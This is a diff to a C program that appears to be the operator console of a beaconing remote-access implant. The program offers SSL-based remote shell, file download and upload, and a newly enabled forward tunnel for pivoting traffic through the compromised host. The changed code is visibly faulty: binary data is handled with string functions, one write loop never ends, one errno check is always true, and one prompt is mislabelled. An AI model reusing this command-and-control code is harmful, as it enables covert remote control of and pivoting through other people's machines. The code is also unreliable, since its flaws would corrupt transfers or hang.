@@ -145,7 +145,7 @@ int cmdloop(SSL* ssl) {
     return putfile(ssl);
   }
   if ((strcmp((char *)msg, "tun")) == 0) {
-    //return tunnel(ssl);
+    return tunnel(ssl);
   }
   if ((strcmp((char *)msg, "win")) == 0) {
     return winset(ssl);
@@ -275,7 +275,7 @@ int cmdshell(SSL *ssl) {
  * On ssl socket errors the client will exit. The server should resume beaconing behavior.
  */
 int getfile(SSL *ssl) {
-  int fd;
+  FILE *fd;
   uint8_t ans[256] = {0};
   uint8_t buf[4096] = {0};
   uint8_t localpath[4096];
@@ -292,7 +292,7 @@ int getfile(SSL *ssl) {
   trim((char *)localpath);
 
   // Create or open the local file 
-  if ((fd = open((char *)localpath, O_WRONLY | O_APPEND | O_CREAT, 0644)) == -1) {
+  if ((fd = fopen((char *)localpath, "a")) == NULL) {
     perror("[-] ERROR: Could not open designated local file");
     return RECOVER;    
   }
@@ -323,19 +323,18 @@ int getfile(SSL *ssl) {
   printf("[*] Getting remote file %s and placing at %s.\n", remotepath, localpath);
   while(written < (size_t)filesize) {
     if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
-    if (writeall(fd, buf, (size_t)filesize - written % sizeof(buf), &written) < 0) {
-      return RECOVER;
-    }
+    fprintf(fd, "%s", buf);
+    written += strlen((char *)buf);
     memset(buf, 0, sizeof(buf));
   }
-  close(fd);
+  fclose(fd);
 
   printf("[+] Wrote %ld bytes to %s.\n", written, localpath);
 
   return SUCCESS;
 
   failure:
-  close(fd);
+  fclose(fd);
   return FAIL;
 }
 
@@ -344,7 +343,7 @@ int getfile(SSL *ssl) {
  * On ssl socket errors the client will exit. The server should resume beaconing behavior.
  */
 int putfile(SSL *ssl) {
-  int fd;
+  FILE *fd;
   uint8_t ans[256] = {0};
   uint8_t buf[4096] = {0};
   uint8_t localpath[4096];
@@ -362,7 +361,7 @@ int putfile(SSL *ssl) {
   trim((char *)remotepath);
 
   // Create or open the local file 
-  if ((fd = open((char *)localpath, O_RDONLY)) == -1) {
+  if ((fd = fopen((char *)localpath, "r")) == NULL) {
     perror("[-] ERROR: Could not open designated local file");
     return RECOVER;    
   }
@@ -389,7 +388,7 @@ int putfile(SSL *ssl) {
   }
 
   // Get the file size and then rewind to the begining of the file
-  fstat(fd, &st);
+  fstat(fileno(fd), &st);
   filesize = st.st_size;
   sprintf((char *)ans, "%ld", filesize);
   if (ssl_writeall(ssl, ans, sizeof(ans)) < 0) {goto failure;}
@@ -399,18 +398,17 @@ int putfile(SSL *ssl) {
 
   while(readin < (size_t)filesize) {
     memset(buf, 0, sizeof(buf));
-    if (readall(fd, buf, (size_t)filesize - readin % sizeof(buf), &readin) < 0) {
-      return RECOVER;
-    }
+    fgets((char *)buf, sizeof(buf), fd);
+    readin += strlen((char *)buf);
     if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
   }
   printf("[+] Sent %ld bytes to remote server to be placed in %s.\n", readin, remotepath);
 
-  close(fd);
+  fclose(fd);
   return SUCCESS;
 
   failure:
-  close(fd);
+  fclose(fd);
   return FAIL;
 }
 
@@ -421,41 +419,40 @@ int putfile(SSL *ssl) {
  * loop the server will revert to its beaconing behavior.
  */
 int tunnel(SSL *ssl) {
-  int res;
-  int keepcnt = 5;
-  int keepidle = 30; 
-  int keepintvl = 30;
-  int keepalive = 1;
-  int n, max = 128;
-  int efd, sfd, ffd;
-  size_t readin = 0;
-  size_t written = 0
+  int efd;
   uint8_t ans[16] = {0};
-  uint8_t buf[4096] = {0};
-  char type[7];
-  char port[6];
-  char addr[INET6_ADDRSTRLEN];
-  struct epoll_event event;
-  struct epoll_event *events;
+  char type[12] = {0};
+  char lport[12] = {0};
+  char dport[12] = {0};
+  char addr[INET6_ADDRSTRLEN] = {0};
 
   // Check which type of tunnel we want to setup
   printf("Which type of tunnel (forward, reverse): ");
-  fgets(type,sizeof(type),stdin);
+  fgets(type, sizeof(type), stdin);
   trim(type);
+  //clearstdin();
+
+  // Grab the port that we want to listen on locally
+  printf("Enter the port to listen on: ");
+  fgets(lport, sizeof(lport), stdin);
+  trim(lport);
+  //clearstdin();
 
   // Grab the address that we want to point our tunnel at
-  printf("Enter the call out IP address: ");
-  fgets(addr,sizeof(addr),stdin);
+  printf("Enter the desitnation IP address: ");
+  fgets(addr, sizeof(addr), stdin);
   trim(addr);
+  //clearstdin();
 
-  // Grab the port that we want to point our tunnel at
-  printf("Enter the port: ");
-  fgets(port, sizeof(port),stdin);
-  trim(port);
+  // Grab the port we want to aim our tunnel at
+  printf("Enter the desitnation IP address: ");
+  fgets(dport, sizeof(dport), stdin);
+  trim(dport);
+  //clearstdin();
 
   // Set the epoll file descriptor
-  if ((efd = epoll_create1(0) < 0) {
-    fprintf(stderr, "[-] Could not open epoll file descriptor. Returning to main menu.\n")
+  if ((efd = epoll_create1(0)) < 0) {
+    fprintf(stderr, "[-] Could not open epoll file descriptor. Returning to main menu.\n");
     return RECOVER;
   }
 
@@ -473,20 +470,20 @@ int tunnel(SSL *ssl) {
 
   // Check to make sure the server is gtg
   if (strcmp((char *)ans, "500") != 0) {
-    frprintf(stderr, "[-] Unexpected code recieved from server: %s\n", ans);
+    fprintf(stderr, "[-] Unexpected code recieved from server: %s\n", ans);
     return FAIL;
   } 
 
   // Based on the tunnel type enter into that command loop
   if (strcmp(type, "forward") == 0) {
-    return forward_tunnel(ssl, efd, &port, &addr);
+    return forward_tunnel(ssl, efd, lport, dport, addr);
   } else if (strcmp(type, "reverse") == 0) {
-    return reverse_tunnel(ssl, efd, &port, &addr);
+    //return reverse_tunnel(ssl, efd, &port, &addr);
   } else {
     printf("[-] Unrecognized tunnel type, please try again.\n");
     return RECOVER;
   }
-  return SUCCESS
+  return SUCCESS;
 }
 
 /**
@@ -497,24 +494,58 @@ int tunnel(SSL *ssl) {
  * or it detects a read/write error on either of the sockets. In the event of a socket error while in the 
  * loop the server will revert to its beaconing behavior.
  */ 
-int forward_tunnel(SSL *ssl, int efd, char *port, char *addr) {
+int forward_tunnel(SSL *ssl, int efd, char *lport, char *dport, char *addr) {
   int res;
+  int r, x, y;
   int tunport;
+  int sfd, ffd;
   int keepcnt = 5;
   int keepidle = 30; 
   int keepintvl = 30;
   int keepalive = 1;
   int n, max = 128;
-  int efd, sfd, ffd;
-  size_t readin = 0;
-  size_t written = 0;
-  uint8_t ans[4] = {0};
+  int ssl_fd = SSL_get_fd(ssl);
+  //size_t readin = 0;
+  //size_t written = 0;
+  uint8_t tmp[8] = {0};
+  uint8_t ans[16] = {0};
   uint8_t buf[4096] = {0};
   char tunaddr[INET6_ADDRSTRLEN];
+  struct timeval timeout;      
   struct epoll_event event;
   struct epoll_event *events;
-  socklen_t socklen = sizeof(server);     
+  struct sockaddr_storage peer;   
+  struct sockaddr_storage target;       
+  socklen_t socklen = sizeof(target);     
   socklen_t peerlen;                      
+
+  // Signal to the server that we are using a forward tunnel
+  if (ssl_writeall(ssl, (uint8_t *)"51", 3) < 0) {return FAIL;}
+
+  // Ensure that the server is gtg.
+  if (ssl_readall(ssl, ans, 4) < 0) {return FAIL;}
+  if (strcmp((char *)ans, "510") != 0) {
+    fprintf(stderr, "[-] Unexpected server response: %s.\n", ans);
+    return FAIL;
+  }
+
+  // Tell the server which address and port to point the tunnel at
+  if (ssl_writeall(ssl, (uint8_t *)addr, strlen(addr) + 1) < 0) {return FAIL;}
+  if (ssl_writeall(ssl, (uint8_t *)dport, strlen(dport) + 1) < 0) {return FAIL;}
+
+  // Setup the listner
+  if (setuplistner(atoi(lport), &sfd) != SUCCESS) {return FAIL;}
+
+  // Register stdin with epoll to see if the user has typed something into the tunnel window.
+  event.data.fd = 0;  // 0 is stdin.
+  event.events = EPOLLIN | EPOLLET;
+  if (epoll_ctl(efd, EPOLL_CTL_ADD, 0, &event) == -1) {return FAIL;}
+
+  // Register the default descriptor to track - sfd in this case
+  memset(&event, 0, sizeof(event));
+  event.data.fd = sfd;
+  event.events = EPOLLIN | EPOLLET;
+  if (epoll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) == -1) {return FAIL;}
 
   // Buffer for the events to be tracked
   if ((events = calloc(max, sizeof(event))) == NULL) {
@@ -522,57 +553,55 @@ int forward_tunnel(SSL *ssl, int efd, char *port, char *addr) {
     return FAIL;
   }
 
-  // Signal to the server that we are using a forward tunnel
-  if (ssl_writeall(ssl, (uint8_t *)"51", 3) < 0) {goto FAIL;}
-
-  // Ensure that the server is gtg.
-  if ((ssl_readall(ssl, ans, 4) < 0) {goto FAIL;}
-  if (strcmp(ans, "510") != 0) {
-    fprintf(stderr, "[-] Unexpected server response: %s.\n", ans);
-    goto failure;
-  }
-
-  // Tell the server which address and port to point the tunnel at
-  if (ssl_writeall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}
-  if (ssl_writeall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}
-
-  // Setup the listner
-  if (setuplistner(atoi(*port), sfd) != SUCCESS) {return FAIL;}
-
-  // Register the default descriptor to track - sfd in this case
-  event.data.fd = sfd;
-  event.events = EPOLLIN | EPOLLET;
-  if (poll_ctl(efd, EPOLL_CTL_ADD, sfd, &event) == -1) {return FAIL;}
-
+  printf("[*] To exit the tunnel interface type 'close' and press enter.\n");
   // Enter into the forward tunnel loop
   while(1) {
     // Wait for events 
     n = epoll_wait(efd, events, max, -1);
 
     // Loop over the alerts
-    for (size_t i = 0; i < n; i++) {
+    for (int i = 0; i < n; i++) {
       if (events[i].events & EPOLLERR || events[i].events & EPOLLHUP || (!events[i].events & EPOLLIN)) {
         close(events[i].data.fd);
-        goto failure;
+        continue;
       } 
+      // Handle user input -- if they want to exit shut down everything and return to the menu.
+      else if (0 == events[i].data.fd) {
+        memset(ans, 0, sizeof(ans));
+        fgets((char *)ans, sizeof(ans), stdin);
+        trim((char *)ans);
+        if (strcmp((char *)ans, "close") == 0) {
+          if (ssl_writeall(ssl, (uint8_t *)"514", 4) < 0) {goto loop_fail;}
+          close(ffd);
+          close(sfd);
+          free(events);
+          return SUCCESS;
+        }
+      }
       // Handle inbound connections 
       else if (sfd == events[i].data.fd) {
         // Accept the connection
-        printf("[+] Detected new connection - accepting call.\n")
-        if ((ffd == accept(sfd, (struct sockaddr *)&target, &socklen)) < 0) {return FAIL;}
+        printf("[+] Detected new connection - accepting call.\n");
+        if ((ffd = accept(sfd, (struct sockaddr *)&target, &socklen)) < 0) {goto loop_fail;}
         
         // Set keepalives
-        if (setsockopt(ffd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {return FAIL;}
-        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {return FAIL;}
-        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {return FAIL;}
-        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {return FAIL;}
+        if (setsockopt(ffd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {goto loop_fail;}
+
+        // Set socket timeout values
+        timeout.tv_sec = 0;
+        timeout.tv_usec = 250;
+        if (setsockopt(ffd, SOL_SOCKET, SO_RCVTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}
+        if (setsockopt(ffd, SOL_SOCKET, SO_SNDTIMEO, (void *)&timeout, sizeof(timeout)) < 0) {goto loop_fail;}
 
         // Put the socket into non-blocking mode
-        if (fcntl(ffd, F_SETFL, O_NONBLOCK) < 0) {return -1}
+        if (fcntl(ffd, F_SETFL, O_NONBLOCK) < 0) {goto loop_fail;}
 
         // Print who we are speaking to.
         peerlen = sizeof(peer);
-        getpeername(serverfd, (struct sockaddr*)&peer, &peerlen);
+        getpeername(ffd, (struct sockaddr*)&peer, &peerlen);
         if (peer.ss_family == AF_INET) {
           struct sockaddr_in *p = (struct sockaddr_in *)&peer;
           tunport = ntohs(p->sin_port);
@@ -585,50 +614,85 @@ int forward_tunnel(SSL *ssl, int efd, char *port, char *addr) {
         printf("[+] Successfully setup connection with tunnel client at %s:%d.\n", tunaddr, tunport);
 
         // Add the event to the event queue - connected socket
-        memset(event, 0, sizeof(event));
+        memset(&event, 0, sizeof(event));
         event.data.fd = ffd;
         event.events = EPOLLIN | EPOLLET;
-        if (poll_ctl(efd, EPOLL_CTL_ADD, ffd, &event) == -1) {return FAIL;}
+        if (epoll_ctl(efd, EPOLL_CTL_ADD, ffd, &event) == -1) {goto loop_fail;}
 
         // Add the event to the event queue - client socket
-        memset(event, 0, sizeof(event));
-        event.data.fd = ssl;
+        memset(&event, 0, sizeof(event));
+        event.data.fd = ssl_fd;
         event.events = EPOLLIN | EPOLLET;
-        if (poll_ctl(efd, EPOLL_CTL_ADD, ssl, &event) == -1) {return FAIL;}
+        if (epoll_ctl(efd, EPOLL_CTL_ADD, ssl_fd, &event) == -1) {goto loop_fail;}
 
         // Message the client to alert them to the new connection
+        printf("[+] Sending message to server to initiate the server setup.\n");
         ssl_writeall(ssl, (uint8_t *)"511", 4);
+        printf("[+] Message sent successfully!\n");
       } 
       // This branch handles incoming data from the target to the tunnel
       else if (ffd == events[i].data.fd) {
-        if ((ssl_writeall(ssl, (uint8_t *)"512", 4) < 0) {goto alert_fail;}
         memset(buf, 0, sizeof(buf));
-        res = readall(ffd, buf, sizeof(buf), &readin)
+        res = read(ffd, buf, sizeof(buf));
         if (res < 0) {
-          goto alert_fail;
+          if (errno != EAGAIN || errno != EWOULDBLOCK) {
+            goto loop_fail;
+          }
+          continue;
         } else if (res == 0) {
+          printf("[*] Target attatched to tunnel disconnected.\n");
           ssl_writeall(ssl, (uint8_t *)"513", 4);
+          close(ffd);
           continue;
         }
-        if ((ssl_writeall(ssl, buf, sizeof(buf) < 0) {goto alert_fail;}
-        } 
-        // This branch should not be reached fail, and resume beaconing
-        else { 
-          return FAIL;
-        }
-      } // This branch handles incoming data from the client side tunnel target
-      else if (ssl == events[i].data.fd) { 
-        ssl_readall
+        printf("[+] About to send %d bytes.\n", res);
+        fwrite(buf, 1, res, stdout);
+        memset(tmp, 0, sizeof(tmp));
+        sprintf((char *)tmp, "%d", res);
+        if (ssl_writeall(ssl, (uint8_t *)"512", 4) < 0) {goto loop_fail;}
+        if (ssl_writeall(ssl, (uint8_t *)tmp, sizeof(tmp)) < 0) {goto loop_fail;}
+        printf("[+] SEND TO SERVER BUFFER: %s", buf);
+        if (ssl_writeall(ssl, buf, res) < 0) {goto loop_fail;}
+      } 
+      // This branch handles incoming data from the client side tunnel target
+      else if (ssl_fd == events[i].data.fd) {
         memset(buf, 0, sizeof(buf));
-        if ((ssl_readall(ssl, buf, sizeof(buf), &readin) < 0) {goto alert_fail;}
-        if ((writeall(ffd, buf, sizeof(buf) < 0) {goto alert_fail;}
+        r = 0;
+        r = SSL_read(ssl, buf, sizeof(buf));
+        fwrite(buf, 1, sizeof(buf), stdout);
+        printf("\n");
+        while (r > 0) {
+          x = 0;
+          while(x < r) {
+            y = write(ffd, buf + x, r - 1);
+            if (y == -1) {
+              if (errno != EAGAIN || errno != EWOULDBLOCK) {
+                continue;
+              } else {
+                y = 0;
+              }
+            }
+            x += y;
+          }
+        }
       } 
       // We should never hit this branch but if we do just see if we can carry on.
       else {  
-        continue;
+        goto loop_fail;
       } // Done checking specific event
     } // Done checking updated events
   } // Loop for reverse tunnel
+
+  loop_fail:
+  printf("[-] The loop failed for some reason...\n");
+  if (ffd > 0) {
+    close(ffd);
+  }
+  if (sfd > 0) {
+    close(sfd);
+  }
+  free(events);
+  return FAIL;
 }
 
 /**
@@ -637,9 +701,11 @@ int forward_tunnel(SSL *ssl, int efd, char *port, char *addr) {
  * or it detects a read/write error on either of the sockets. In the event of a socket error while in the 
  * loop the server will revert to its beaconing behavior.
  */ 
+/*
 int reverse_tunnel(SSL *ssl, int efd, char *port, char *addr) {
 
 }
+*/
 
 /**
  * Set the time to sleep between each beacon the server will send. On error the server 
@@ -693,6 +759,16 @@ void trim(char *str) {
     i++;
   }
   str[index+1] = '\0';
+}
+
+/**
+ * Clear the prompt standard input to make sure we don't overflow buffers when reading in user input.
+ */
+void clearstdin() {
+  int c; 
+  while (c != '\n' && c != EOF) {
+    c = getchar();
+  }
 }
 
 /**
